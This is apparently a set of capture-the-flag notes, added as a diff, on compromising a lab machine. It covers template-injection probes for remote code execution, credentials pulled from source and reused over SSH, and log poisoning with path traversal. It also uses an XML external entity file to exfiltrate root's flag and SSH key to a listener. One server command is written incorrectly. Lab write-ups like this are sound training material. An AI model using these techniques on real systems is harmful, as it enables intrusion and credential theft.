@@ -1,0 +1,32 @@
+- Scan 10.10.11.170 (naabu -host 10.10.11.170) => 8080 | 22
+- http://10.10.11.170:8080 | /stats?author={{7+7}} => tomcat | <title>Red Panda Search | Made with Spring Boot</title> => java spring
+- dirsearch 10.10.11.170:8080 => 3 page => search => test for ssti: https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/ => 
+	req: #{{7*7}} => response: ??{7*7}_en_GB?? => potencial ssti | 
+	req: #{7*7} => response: ??49_en_GB?? => firm ssti | 
+	req: *{7*7} => response: 49 => correct payload (payload for java spring ${...}|*{...}|#{...}|@{...}|~{...})
+- Using https://github.com/VikasVarshney/ssti-payload to genareate RCE due to web fillter.
+* Solution 1:
+- cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java => mysql connection => woodenk|RedPandazRule
+- ssh woodenk@10.10.11.170 RedPandazRule => User:woodenk , groups:woodenk => User.txt
+- psaux => /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1- => webserver run as user woodenk but group logs.
+- pspy => crontab run /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar every 2 mins as root
+- code review => crontab use to count view picture view. 
+  drw-r-x---   2 root logs  4096 Jun 21 12:32 credits => woodenk can't view this but group user logs can.
+  => ssti: ls -al /credits => damian_creds.xml, woodenk_creds.xml => xml format.
+- code review /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java => how logs being read and count.
+- create a bash script to back connect to pc and run with sstiRCE to get logs permission so we can manupilate /opt/panda_search/redpanda.log file
+- base on how the code work create a image (greg.jpg) have author(artis): ../../../home/woodenk/abc
+- create abc_creds.xml and malicious.dtd so when abc_creds.xml being execute it will load malicious.dtd to read root.txt file (extra and stupid ways but this is what i came up T.T)
+- copy all the greg.jpg,abc_creds.xml, back connect shell to home woodenk.
+- upgrade tty shell python3 -c 'import pty;pty.spawn("/bin/bash")'.
+- write logs file with new line /../../../../../../../../../../../../home/woodenk/greg.jpg so we can redirect the image to the one we want to.
+- base on how the code work create a image have author(artis): ../../../home/woodenk/abc => create our pre-define xml instead of legal one (inside /credits/*).
+- host python server: python3 -m server.http 8000 to get back content from our xxe injection.
+- wait 2 mins for crontab to run => get /root/root.txt flag.
+
+* Solution 2:(quangtb&linhch)
+- almost same a soluton 1 but instead of of revershell using ssti to get logs permission => manupilate userAgent so the name of picture have to contain ||.
+- using ssti to get xml format cand read file /root/.ssh/id_rsa
+- using demosolotion2.xml file.
+- after crontab run &file; will be replace with root id_rsa
+- ssh => root.txt
